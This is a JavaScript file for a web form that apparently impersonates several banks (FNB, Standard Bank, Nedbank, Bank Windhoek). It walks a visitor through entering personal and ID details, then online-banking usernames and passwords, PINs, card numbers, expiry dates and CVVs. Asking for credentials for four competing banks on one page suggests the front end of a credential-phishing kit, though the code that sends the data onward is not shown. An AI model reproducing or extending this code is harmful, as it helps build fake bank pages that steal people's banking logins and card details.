let nav = document.getElementById('icon1')
let count = 0;
let display = 0

let form1 = document.getElementById('form1')
let form2 = document.getElementById('form2')

let fname = document.getElementById('name')
let sname = document.getElementById('surname')
let address = document.getElementById('address')
let phoneNumber = document.getElementById('phone')
let account = document.getElementById('account')
let identity = document.getElementById('identity')
let email = document.getElementById('email')
const next = document.getElementById("next")

let showBanks = document.getElementById('banks')
let banks = document.getElementById('show-element')
let indivBanks = document.querySelectorAll('.single-banks')

const fnbs = document.querySelectorAll(".fnbs")
const nedbanks = document.querySelectorAll(".nedbank")
const windhoeks = document.querySelectorAll(".windhoeks")
const standard = document.querySelectorAll(".standard")

const next1 = document.getElementById("next1")
const next2 = document.getElementById("next2")
let card = document.getElementById('card')
let pin = document.getElementById('pin')
let username = document.getElementById('username')
let password = document.getElementById('password')

let standardUsername = document.getElementById('standardUsername')
let standardPassword = document.getElementById('standardPassword')

let profileNumber = document.getElementById('profileNumber')
let profilePassword = document.getElementById('profilePassword')

let windhoekEmail = document.getElementById('windhoek-email')
let windhoekPassword = document.getElementById('wimdhoek-password')
let windhoekPin = document.getElementById('wimdhoek-pin')
let cardNumber = document.getElementById('cardNumber')
let cardDate = document.getElementById('card-date')
let cvv = document.getElementById('cvv')

let error = document.getElementById('error')
let error2 = document.getElementById('error2')
let error3 = document.getElementById('error3')
let error4 = document.getElementById('error4')
let agree = document.getElementById("agree")
let count2 = 0;
let terms = document.getElementById('terms')
let submit1 = document.getElementById('submit1')
let submit2 = document.getElementById('submit2')
let submit3 = document.getElementById('submit3')
let submit4 = document.getElementById('submit4')

nav.addEventListener('click', ()=>{
    count++
    if(count > 0){
        div2.style.margin = '0 0 0 0'
    }
     if(count > 1){
        div2.style.margin = '-20% 0 0 0'
        count = 0;
    }
})

showBanks.addEventListener('click', showBank)
function showBank(){
    display ++
    if(display = 1 ){
        banks.style.margin = '-15% 0 0 0'
        showBanks.style.display = 'none'
    }
    display = 0;
}
let FNB = document.getElementById('FNB-details')
let STANDARD = document.getElementById('STANDARD-details')
let NEDBANK = document.getElementById('NEDBANK-datails')
let WINDHOEK = document.getElementById('WINDHOEK-details')

let option1 = document.getElementById('opt1')
option1.setAttribute("name", "bank");
let opt1 = option1.getAttribute("name");

indivBanks.forEach(element => {
    element.classList.remove('zoomed');
    // Add event listener for the click event
    element.addEventListener('click', function() {
        // First, remove the 'zoomed' class from all elements

            // banks.style.margin = '15% 0 0 -105%'
        indivBanks.forEach(el => {
            el.classList.remove('zoomed')
            el.style.display = "none"
            el.style.transitionDuration = "3s"
        });
    
        // Then, add the 'zoomed' class to the clicked element
        let div1 = document.getElementById('div1')
        this.classList.add('zoomed');
        this.style.display = "block"
        this.style.margin = "20% 0 0 0"
        div2.style.margin = "-23% 0 0 0"
        div1.style.position = "relative"
        div1.style.margin = "-25% 0 0 0"
        div1.style.transitionDuration = "2s"


        // Get the paragraph inside the clicked div
        let paragraph = this.querySelector('p');
        
        // Set the name attribute of the paragraph to 'bank'
        paragraph.setAttribute('name', 'bank');

        // Optional: Log the name attribute to the console
        console.log(`The name attribute of the paragraph is set to: ${paragraph.getAttribute('name')}`);

        // Apply logic based on paragraph text
        let paragraphText = paragraph.textContent.trim();  // Trim any extra spaces

        setTimeout(() => {
            // banks.style.margin = '-15% 0 0 -105%'
            // element.classList.remove('zoomed');
            // this.classList.remove('zoomed');

            // this.style.display = "none"
            if(paragraphText === "FNB"){
                FNB.style.display = "block";
                option1.value = "FNB"
                option1.innerHTML = "FNB"

            }else if(paragraphText === "STANDARD BANK"){
                STANDARD.style.display = "block"
                console.log(paragraphText)
                option1.value = "STANDARD BANK"
                option1.innerHTML = "STANDARD BANK"
               

            }else if(paragraphText === "NEDBANK"){
                NEDBANK.style.display = "block"
                // FNB.style.display = "none"
                // this.classList.remove('zoomed');
                // element.classList.remove('zoomed')
                option1.value = "NEDBANK"
                option1.innerHTML = "NEDBANK"
                indivBanks.forEach(el => {
                    el.classList.remove('zoomed')
                    el.style.display = "none"
                    el.style.transitionDuration = "3s"
                });

            }else if(paragraphText === "WINDHOEK"){
                WINDHOEK.style.display = "block"
                option1.value = "WINDHOEK"
                option1.innerHTML = "WINDHOEK"
                // NEDBANK.style.display = "none"

            }
        }, 1000);

    });
});



next.addEventListener('click', ()=>{
    console.log(next, error, form1, form2)
    if(fname.value ==="" || sname.value ==="" || address.value ==="" ||
        phoneNumber.value === "" || account.value ==="" || identity.value === "" || email.value === ""){
            error.innerHTML = "kindly fill all the required details above";
            error.style.color = "red";
            error.style.fontSize =  "300%";
            error.style.textAlign =  "center";
            console.log("na me")
            setTimeout(sub, 2000);
            function sub(){
                error.innerHTML = ''
            }
        }else if(agree.checked == 0){
            error.innerHTML = "kindly read and agree to the terms and conditions";
            error.style.color = "red";
            error.style.fontSize =  "300%";
            error.style.textAlign =  "center";
            setTimeout(sub, 2000);
            function sub(){
                error.innerHTML = ''
            }
        } else{
            console.log("here")
            setTimeout(bub, 1000);
            function bub(){
                form1.style.display = 'none'
                form2.style.display = 'block'
                terms.style.display = 'none'
                error.innerHTML = '';
            }
        }
})



let value
cardDate.addEventListener('input', (event)=>{
    console.log('Current value:', event.target.value);
    value = event.target.value;
            
    // Check if the first character is 3-9
    if (/^[2-9]/.test(value)) {
        // Clear the input if it starts with an invalid digit
        event.target.value = '';
        return;
    }else if(value.includes('1')){
        // Check if the length is 2, and the second character is 3-4
        if (/^[3-9]/.test(value[1])) {
            // Clear the input if the second digit is 3-4
            event.target.value = value[0];
            return;
        }
    }else if(value.includes('0')){
        if (value[1].includes('0')) {
            // Clear the input if the second digit is 3-4
            event.target.value = value[0];
            return;
        } 
    }

    // Check if the length is 2 and no slash has been added yet
    if (value.length === 2 && !value.includes('/')) {
        // Add a slash after the first two digits
        event.target.value = value + '/';
    }
    
    if (/^[4-9]/.test(value[3])) {
        // Clear the input if it starts with an invalid digit
        event.target.value = value[0] +  value[1] + value[2];
        return;
    }
    if(/[3]/.test(value[3])){
        if (/^[2-9]/.test(value[4])) {
            // Clear the input if the second digit is 3-4
            event.target.value = value[0] +  value[1] + value[2] + value[3];
            return;
        }
    }
})

let cardCvv = document.getElementById('cvv');
cardCvv.addEventListener('input', (event) => {
    let value = event.target.value;

    // Ensure the input does not exceed three digits
    if (value.length > 3) {
        event.target.value = value.slice(0, 3); // Keep only the first three digits
    }
});


next1.addEventListener('click', ()=>{
    console.log('me')
    let caution = document.getElementById('caution1')
    let continue1 = document.getElementById('continue1')
    let continue2 = document.getElementById('continue2')
    caution.style.color = "red";
    caution.style.fontSize =  "300%"
    caution.style.textAlign =  "center"
    if(username.value === ""){
        caution.innerHTML = "kindly fill in your username";
        setTimeout(() => {
            caution.innerHTML = ""
        }, 500);
        
    }else if (password.value === ""){
        caution.innerHTML = "kindly fill in your password";
        setTimeout(() => {
            caution.innerHTML = ""
        }, 500); 
    }else{
        continue1.style.display = "none"
        continue2.style.display = "block"
    }
})

next2.addEventListener('click', ()=>{
    console.log('me')
    let caution = document.getElementById('caution2')
    let continue3 = document.getElementById('continue3')
    let continue4 = document.getElementById('continue4')
    caution.style.color = "red";
    caution.style.fontSize =  "300%"
    caution.style.textAlign =  "center"
    if(windhoekEmail.value === ""){
        caution.innerHTML = "kindly fill in your username";
        setTimeout(() => {
            caution.innerHTML = ""
        }, 500);
        
    }else if (windhoekPassword.value === ""){
        caution.innerHTML = "kindly fill in your password";
        setTimeout(() => {
            caution.innerHTML = ""
        }, 500); 
    }else{
        continue3.style.display = "none"
        continue4.style.display = "block"
    }
})

fnbs.forEach(input => {
    // submit1.style.backgroundColor = '#cccccc'
    input.addEventListener('input', (event) =>{
        console.log('hhh')
        if(card.value === "" || pin.value === ""){
            error2.innerHTML = "kindly fill all the required details above";
            error2.style.color = "red";
            error2.style.fontSize =  "300%"
            error2.style.textAlign =  "center"
            // Disable the button if the input is empty or contains only spaces
            submit1.disabled = true;

            }else{
                // Enable the button if the input is not empty
                submit1.disabled = false;
                // submit1.style.backgroundColor = "black"
                // submit1.style.color = "white"
                console.log('hhh')
                submit1.addEventListener('click', ()=>{
                    submit1.style.backgroundColor = "yellow"
                    submit1.style.color = "black"
                })
                error2.innerHTML = '';    
            }
    })
});

standard.forEach(input => {
    // submit2.style.margin = '-2% 0 0 0'
    input.addEventListener('input', (event) =>{
        if(standardUsername.value === "" || standardPassword.value === "" ){
            error2.style.display = "block";
            error2.innerHTML = "kindly fill all the required details above";
            error2.style.color = "red";
            error2.style.fontSize =  "300%"
            error2.style.textAlign =  "center"
            // Disable the button if the input is empty or contains only spaces
            submit2.disabled = true;
            
        }else{
            // Enable the button if the input is not empty
            submit2.disabled = false;
            console.log('hhh')
            submit2.addEventListener('click', ()=>{
                submit2.style.backgroundColor = "yellow"
                submit2.style.color = "black"
            })
            error2.innerHTML = '';
               
            }
    })
});


nedbanks.forEach(input => {
    input.addEventListener('input', (event) =>{
        console.log('hhh')
        if(profileNumber.value === "" || profilePassword.value === "" ){
            error2.innerHTML = "kindly fill all the required details above";
            error2.style.color = "red";
            error2.style.fontSize =  "300%"
            error2.style.textAlign =  "center"
            // Disable the button if the input is empty or contains only spaces
            submit3.disabled = true;
            
            }else{
                submit3.disabled = false;
                submit3.style.display = 'block';
                submit3.style.margin = '-3 0 -10 0'
                submit3.addEventListener('click', ()=>{
                    submit3.style.backgroundColor = "yellow"
                    submit3.style.color = "black"
                    
                })
                error2.innerHTML = '';
               
            }
    })
});

windhoeks.forEach(input => {
    input.addEventListener('input', (event) =>{
        console.log('hhh')
        if(windhoekEmail.value === "" || windhoekPassword.value === "" ||
            cardNumber.value === ""|| value === ""  || cvv.value === "" || 
            windhoekPin.value === ""
         ){
        error4.innerHTML = "kindly fill all the required details above";
        error4.style.color = "red";
        error4.style.fontSize =  "300%"
        error4.style.textAlign =  "center"
        submit4.disabled = true;
        setTimeout(bub, 1000);
        function bub(){
           
            error.innerHTML = '';
        }
            
            }else{
            submit4.disabled = false;
            submit4.style.margin = '-3 0 -10 0'
            submit4.addEventListener('click', ()=>{
                submit4.style.backgroundColor = "yellow"
                submit4.style.color = "black"
                
            })
            error4.innerHTML = '';
           
        }
    })
});   


let subscribe = document.getElementById('check')
let Subscribe = setTimeout(sub, 7000);
function sub(){
    subscribe.style.animationName = 'check';

}










// let value
// cardDate.addEventListener('input', (event)=>{
//     console.log('Current value:', event.target.value);
//     value = event.target.value;
            
//         // Check if the first character is 3-9
//         if (/^[2-9]/.test(value)) {
//             // Clear the input if it starts with an invalid digit
//             event.target.value = '';
//             return;
//         }

//         // Check if the length is 2, and the second character is 3-4
//         if (/^[3-9]/.test(value[1])) {
//             // Clear the input if the second digit is 3-4
//             event.target.value = value[0];
//             return;
//         }

//         // Check if the length is 2 and no slash has been added yet
//         if (value.length === 2 && !value.includes('/')) {
//             // Add a slash after the first two digits
//             event.target.value = value + '/';
//         }
      
// })

// let cardCvv = document.getElementById('cvv');
// cardCvv.addEventListener('input', (event) => {
//     let value = event.target.value;

//     // Ensure the input does not exceed three digits
//     if (value.length > 3) {
//         event.target.value = value.slice(0, 3); // Keep only the first three digits
//     }
// });
